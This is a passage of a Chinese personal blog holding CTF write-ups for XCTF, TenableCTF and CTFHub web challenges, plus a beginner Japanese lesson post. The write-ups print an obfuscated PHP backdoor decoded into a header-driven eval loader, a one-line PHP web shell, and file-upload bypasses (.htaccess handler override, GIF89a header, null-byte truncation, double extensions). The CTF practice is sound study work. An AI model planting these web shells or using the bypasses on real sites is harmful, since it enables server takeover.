class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">  <span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">8080</span>; <span class="comment">## listen for ipv4; this line is default and implied</span></span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">8080</span>; <span class="comment">## listen for ipv6</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    <span class="attribute">index</span> index.php index.html index.htm;</span><br><span class="line">    <span class="attribute">port_in_redirect</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">server_name</span> _;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make site accessible from http://localhost/</span></span><br><span class="line">    <span class="comment">#server_name localhost;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If block for setting the time for the logfile</span></span><br><span class="line">    if ($time_iso8601 ~ &quot;^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)&quot;) &#123;</span><br><span class="line">       <span class="attribute">set</span> $year <span class="variable">$1</span>;</span><br><span class="line">       <span class="attribute">set</span> $month <span class="variable">$2</span>;</span><br><span class="line">       <span class="attribute">set</span> $day <span class="variable">$3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html</span></span><br><span class="line">    <span class="attribute">sendfile</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">set</span> $http_x_forwarded_for_filt $http_x_forwarded_for;</span><br><span class="line">        <span class="attribute">if</span> ($http_x_forwarded_for_filt <span class="regexp">~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+)</span> &#123;</span><br><span class="line">                <span class="attribute">set</span> $http_x_forwarded_for_filt <span class="variable">$1</span>???;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add stdout logging</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;</span><br><span class="line">    <span class="attribute">error_log</span> /var/log/nginx/error.log <span class="literal">info</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="comment"># First attempt to serve request as file, then</span></span><br><span class="line">        <span class="comment"># as directory, then fall back to index.html</span></span><br><span class="line">        <span class="attribute">try_files</span> $uri $uri/ /index.php?q=$uri&amp;$args;</span><br><span class="line">        <span class="attribute">server_tokens</span> <span class="literal">off</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#error_page 404 /404.html;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span> /50x.html;</span><br><span class="line">    <span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">        <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">try_files</span> $uri $uri/ /index.php?q=$uri&amp;$args;</span><br><span class="line">        <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span> unix:/var/run/php/php5.6-fpm.sock;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_NAME $fastcgi_script_name;</span><br><span class="line">        <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> REMOTE_ADDR $http_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ /\.</span> &#123;</span><br><span class="line">            <span class="attribute">log_not_found</span> <span class="literal">off</span>;</span><br><span class="line">            <span class="attribute">deny</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> /web-img &#123;</span><br><span class="line">        <span class="attribute">alias</span> /images/;</span><br><span class="line">        <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~* \.(ini|docx|pcapng|doc)$</span> &#123;  </span><br><span class="line">         <span class="attribute">deny</span> all;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span> /var/www/nginx[.]conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$U&#x3D;&#39;_&#x2F;|U&quot;,&quot;&#x2F;-&#x2F;|U&quot;),ar|Uray|U(&quot;&#x2F;|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U&#x3D;o|Ub_get_|Ucontents(|U);|Uob_end_cle&#39;;</span><br><span class="line">$q&#x3D;&#39;s[|U$i]&#x3D;&quot;&quot;;$p&#x3D;|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].&#x3D;|U$p|U;|U$e&#x3D;|Ustrpos($s[$i],$f);|Ui&#39;;</span><br><span class="line">$M&#x3D;&#39;l&#x3D;&quot;strtolower|U&quot;;$i&#x3D;$m|U[1|U][0].$m[1]|U[1];$|U|Uh&#x3D;$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f&#x3D;$s|Ul($ss(|Umd5($i.$&#39;;</span><br><span class="line">$z&#x3D;&#39;r&#x3D;@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua&#x3D;@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u&#x3D;parse_|Uurl($r&#39;;</span><br><span class="line">$k&#x3D;&#39;?:;q&#x3D;0.([\\|Ud]))?,|U?&#x2F;&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s&#x3D;&amp;$_SESSIO|UN;$ss&#x3D;&quot;|Usubst|Ur&quot;;|U|U$s&#39;;</span><br><span class="line">$o&#x3D;&#39;|U$l;|U)&#123;for|U($j&#x3D;0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.&#x3D;$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r&#x3D;$|U_SERV|UE|UR;$r&#39;;</span><br><span class="line">$N&#x3D;&#39;|Uf($e)&#123;$k&#x3D;$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;&#x2F;&#39;;</span><br><span class="line">$C&#x3D;&#39;an();$d&#x3D;b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;&#x2F;$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#39;;</span><br><span class="line">$j&#x3D;&#39;$k|Uh&#x3D;&quot;|U|U42f7&quot;;$kf&#x3D;&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U&#x3D;|Ustrlen($k);$l&#x3D;s|Utrl|Ue|Un($t);$o&#x3D;|U&quot;&quot;;fo|Ur($i&#x3D;0;$i&lt;&#39;;</span><br><span class="line">$R&#x3D;str_replace(&#39;rO&#39;,&#39;&#39;,&#39;rOcreatrOe_rOrOfurOncrOtion&#39;);</span><br><span class="line">$J&#x3D;&#39;kf|U),|U0,3));$p&#x3D;&quot;|U&quot;;for(|U|U$|Uz&#x3D;1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.&#x3D;|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U&#x3D;&#x3D;&#x3D;0)&#123;$&#39;;</span><br><span class="line">$x&#x3D;&#39;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq&#x3D;array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;&#x2F;([\\|U|Uw])[|U\\w-]+|U(&#39;;</span><br><span class="line">$f&#x3D;str_replace(&#39;|U&#39;,&#39;&#39;,$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);</span><br><span class="line">echo($f);</span><br><span class="line"># $g&#x3D;create_function(&#39;&#39;,$f);</span><br><span class="line"># $g();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;42f7&quot;</span>;<span class="variable">$kf</span>=<span class="string">&quot;e9ac&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;<span class="variable">$c</span>=strlen(<span class="variable">$k</span>);<span class="variable">$l</span>=strlen(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;<span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;&#125;&#125;<span class="keyword">return</span> <span class="variable">$o</span>;&#125;<span class="variable">$r</span>=<span class="variable">$_SERVER</span>;<span class="variable">$rr</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];<span class="variable">$ra</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<span class="keyword">if</span>(<span class="variable">$rr</span>&amp;&amp;<span class="variable">$ra</span>)&#123;<span class="variable">$u</span>=parse_url(<span class="variable">$rr</span>);parse_str(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>],<span class="variable">$q</span>);<span class="variable">$q</span>=array_values(<span class="variable">$q</span>);preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="variable">$ra</span>,<span class="variable">$m</span>);<span class="keyword">if</span>(<span class="variable">$q</span>&amp;&amp;<span class="variable">$m</span>)&#123;@session_start();<span class="variable">$s</span>=&amp;<span class="variable">$_SESSION</span>;<span class="variable">$ss</span>=<span class="string">&quot;substr&quot;</span>;<span class="variable">$sl</span>=<span class="string">&quot;strtolower&quot;</span>;<span class="variable">$i</span>=<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];<span class="variable">$h</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>));<span class="variable">$f</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>));<span class="variable">$p</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$z</span>=<span class="number">1</span>;<span class="variable">$z</span>&lt;count(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++)<span class="variable">$p</span>.=<span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];<span class="keyword">if</span>(strpos(<span class="variable">$p</span>,<span class="variable">$h</span>)===<span class="number">0</span>)&#123;<span class="variable">$s</span>[<span class="variable">$i</span>]=<span class="string">&quot;&quot;</span>;<span class="variable">$p</span>=<span class="variable">$ss</span>(<span class="variable">$p</span>,<span class="number">3</span>);&#125;<span class="keyword">if</span>(array_key_exists(<span class="variable">$i</span>,<span class="variable">$s</span>))&#123;<span class="variable">$s</span>[<span class="variable">$i</span>].=<span class="variable">$p</span>;<span class="variable">$e</span>=strpos(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="variable">$f</span>);<span class="keyword">if</span>(<span class="variable">$e</span>)&#123;<span class="variable">$k</span>=<span class="variable">$kh</span>.<span class="variable">$kf</span>;ob_start();@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),<span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="number">0</span>,<span class="variable">$e</span>))),<span class="variable">$k</span>)));<span class="variable">$o</span>=ob_get_contents();ob_end_clean();<span class="variable">$d</span>=base64_encode(x(gzcompress(<span class="variable">$o</span>),<span class="variable">$k</span>));<span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);@session_destroy();&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>后面抄都抄不会了，放弃</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/20/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E7%BA%A7/" data-id="ckloj8nw70007vcus9dh1guzr" data-title="CTF-wp-攻防世界web高级" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-TenableCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/19/CTF-wp-TenableCTF/" class="article-date">
  <time class="dt-published" datetime="2021-02-19T01:07:54.000Z" itemprop="datePublished">2021-02-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/19/CTF-wp-TenableCTF/">CTF-wp-TenableCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Source-of-All-Evil"><a href="#Source-of-All-Evil" class="headerlink" title="Source of All Evil"></a>Source of All Evil</h1><p>访问robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mr_roboto&#125;</span><br></pre></td></tr></table></figure>
<p>查看index的源码，发现flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;best_implants_ever&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Stay-Away-Creepy-Crawlers"><a href="#Stay-Away-Creepy-Crawlers" class="headerlink" title="Stay Away Creepy Crawlers"></a>Stay Away Creepy Crawlers</h1><p>和Source of All Evil用的同一个代码，flag用的robots.txt的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mr_roboto&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Headers-for-you-inspiration"><a href="#Headers-for-you-inspiration" class="headerlink" title="Headers for you inspiration"></a>Headers for you inspiration</h1><p>抓包，在response包的头部</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;headersftw&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Can‘t-find-it"><a href="#Can‘t-find-it" class="headerlink" title="Can‘t find it"></a>Can‘t find it</h1><p>URL处访问indexes.php显示的flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;404_oh_no&#125; </span><br></pre></td></tr></table></figure>
<p>话说这题目是不是出错了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/19/CTF-wp-TenableCTF/" data-id="ckloj8nw10005vcusddkp2fo4" data-title="CTF-wp-TenableCTF" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-CTFHub" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/18/CTF-wp-CTFHub/" class="article-date">
  <time class="dt-published" datetime="2021-02-18T00:49:20.000Z" itemprop="datePublished">2021-02-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/18/CTF-wp-CTFHub/">CTF-wp-CTFHub</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>在这个目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10080&#x2F;flag_in_here&#x2F;3&#x2F;2&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>在页面搜索flag</p>
<h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><p>访问<a target="_blank" rel="noopener" href="http://www.zip,得到网站源文件/">www.zip，得到网站源文件</a></p>
<p>看到flag_259802413.txt，打开后没内容</p>
<p>在网页端访问flag_259802413.txt，得到flag</p>
<h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p>访问index.php.bak，在下载的文件中得到flag</p>
<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>访问.index.php.swp</p>
<p>执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h2><p>直接上传，用antsword连接（菜刀被禁了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;fca79403ea30c31b6413be65&#125;</span><br></pre></td></tr></table></figure>
<h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><p>取消前端js后，直接上传，用antsword连接</p>
<p>php文件无法下载，也不知道为什么</p>
<p>直接在页面执行命令，用cat查看flag文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;a849b8485adeaf5a66c6f477&#125;</span><br></pre></td></tr></table></figure>
<h2 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h2><p>将content-type修改为image/jpeg，其他操作与上面相同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;5e9686dcfdf07612284fddae&#125;</span><br></pre></td></tr></table></figure>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>.htaccess的格式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;    </span><br></pre></td></tr></table></figure>
<p>然后上传一个php文件，在burp中将文件名改为1.jpg</p>
<p>使用antsword连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;6e504a1abc30e2ca266b7335&#125;</span><br></pre></td></tr></table></figure>
<h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h2><p>在文件内容前添加GIF89a</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;d.php&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;caa67ce803f60c6f9776b631&#125;</span><br></pre></td></tr></table></figure>
<h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>在URL处，修改URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?road&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;1.php%00 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>而用户名处，修改用户名为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.jpg</span><br></pre></td></tr></table></figure>
<p>注意，此处修改用户名为1.php%001.jpg，虽然能上传成功，但是无法用antsword连接（</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;8df08862cb34869e11b4cf33&#125;</span><br></pre></td></tr></table></figure>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>将文件名修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.phphpp</span><br></pre></td></tr></table></figure>
<p>即可成功上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;7abd22955056b5d994fc2f14&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/18/CTF-wp-CTFHub/" data-id="ckloj8nvu0003vcus9r1z1m61" data-title="CTF-wp-CTFHub" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-考证-日语-初级课文汉译日" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/15/%E8%80%83%E8%AF%81-%E6%97%A5%E8%AF%AD-%E5%88%9D%E7%BA%A7%E8%AF%BE%E6%96%87%E6%B1%89%E8%AF%91%E6%97%A5/" class="article-date">
  <time class="dt-published" datetime="2021-02-15T14:30:56.000Z" itemprop="datePublished">2021-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/15/%E8%80%83%E8%AF%81-%E6%97%A5%E8%AF%AD-%E5%88%9D%E7%BA%A7%E8%AF%BE%E6%96%87%E6%B1%89%E8%AF%91%E6%97%A5/">考证-日语-初级课文汉译日</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="第7课"><a href="#第7课" class="headerlink" title="第7课"></a>第7课</h1><p>李さんは毎日　<strong>コーヒー</strong>　を飲みます</p>
<p>李さんは　<strong>図書館（としょかん）</strong>　で　<strong>勉強（べんきょう）</strong>　します</p>
<p>私は毎朝パンかお粥を食べます</p>
<p>コーラとケーキください</p>
<p>甲：李さん、今日うちで　<strong>新聞（しんぶん）</strong>　をよみますか</p>
<p>乙：いいえ、読みませんでした</p>
<p>甲：今朝何を食べますか</p>
<p>乙：何も食べませんでした</p>
<p>甲：吉田さん、日曜日何をしますか</p>
<p>乙：テニスか　<strong>じょぎんぐ</strong>　をします</p>
<p>甲：いらっしやいませ</p>
<p>乙：この　<strong>ノート　**と　**鉛筆（えんぴつ）</strong>　をください</p>
<p>吉田：李さん、これから　<strong>昼（ひる）</strong>　ご飯たべますか</p>
<p>李：はい、小野さんといしょに行きます</p>
<p>小野：　<strong>課長（かちょう）</strong>　は？</p>
<p>吉田：コンビニでお弁当とお茶を買いました</p>
<p>李：いつもはコンビニですか</p>
<p>吉田：いいえ、いつもは蕎麦屋へ、そばかうどんを食べます</p>
<p>李：そ　<strong>う</strong>　ですね</p>
<p>小野：李さん、今日そば屋へ行きますか</p>
<p>李：そうですね</p>
<p>小野：じゃ、課長、　<strong>失礼（しつれい）</strong>　します</p>
<p>吉田：いってら　<strong>っ</strong>　しゃ　<strong>い</strong></p>
<p>店员：　<strong>いらっしゃいませ</strong></p>
<p>小野：すみません、親子丼（おやこどん）ください、李さんは？</p>
<p>李：私もこれです</p>
<p>店员：かしこまりました</p>
<h1 id="第8课"><a href="#第8课" class="headerlink" title="第8课"></a>第8课</h1><p>李さんは　<strong>日本語（にほんご）</strong>　で　<strong>手紙（てがみ）</strong>　を書けます</p>
<p>私は小野さんにお土産をもらいました</p>
<p>私は小野さんに　<strong>辞書（こしょ）</strong>　をもらいました</p>
<p>李さんは明日長島さんに会います</p>
<p>甲：昨日母に　<strong>プレゼント</strong>　を送ります。</p>
<p>乙：何で送りますか</p>
<p>甲：　<strong>航空便（こうくうびん）</strong>　で送りました</p>
<p>甲：<strong>この映画（えいが）のチケットをだれにあげますか</strong></p>
<p>乙：李さんにあげます</p>
<p>甲：だれにこのパンフレットをもらいますか</p>
<p>乙：長島さんにもらいました</p>
<p>甲：すみません、李さんはいますか</p>
<p>乙：もう　<strong>帰り（かえり）</strong>　ましたよ</p>
<p>小野：さっき、長島さんに電話をあげました</p>
<p>李：<strong>スケジュール</strong>　表の件ですか</p>
<p>小野：はい</p>
<p>李：もう　<strong>ファックス</strong>　送りますたよ</p>
<p>小野：いつですか</p>
<p>李：昨日の　<strong>夕方（ゆうがた）</strong>　です、もう<strong>（一度いちど）</strong>　送りますか</p>
<p>小野：ええ、お願　<strong>い</strong>　します、私は　<strong>メール</strong>　で送ります</p>
<p>李：分かりました。</p>
<p>小野：李さん、たった今長島さんにメールをもらいました</p>
<p>李：ファックス　<strong>は</strong>　<strong>届き「とどき」</strong>　したか</p>
<p>小野：ええ、ファックスも、メールも届きました</p>
<p>李：そうですか、よかったです</p>
<p>小野：李さん、これ、ど　<strong>う</strong>　そ。箱根の写真集です。　<strong>前</strong>　に長島さんにもらいました</p>
<p>李：ありがとう　<strong>ござ</strong>　います　</p>
<h1 id="第9课"><a href="#第9课" class="headerlink" title="第9课"></a>第9课</h1><p>　<strong>四川（しせん）</strong>　料理は辛いです</p>
<p>この　<strong>スープ</strong>　はあまり熱くないです</p>
<p>旅行はとてもたのしかったです</p>
<p>中国は広い国です</p>
<p>甲：　<strong>天気</strong>　はよっかたですか</p>
<p>乙： いいえ、あまりよくなっかたです</p>
<p>甲：　<strong>天安門（てんあんもん）</strong>　へ行きましたか</p>
<p>乙：はい、とても　<strong>大きい（おおきい）</strong>　建物ですね</p>
<p>甲：　<strong>万里の長城（ばんりのちょうじょう）</strong>　は北京から遠いですか</p>
<p>乙：いいえ、あまり遠くないです</p>
<p>甲：北京ダックはたべましたか  <strong>##此处ha表对比，详见第5课语法5</strong></p>
<p>乙：はい、たべました、とてもおいしかったです</p>
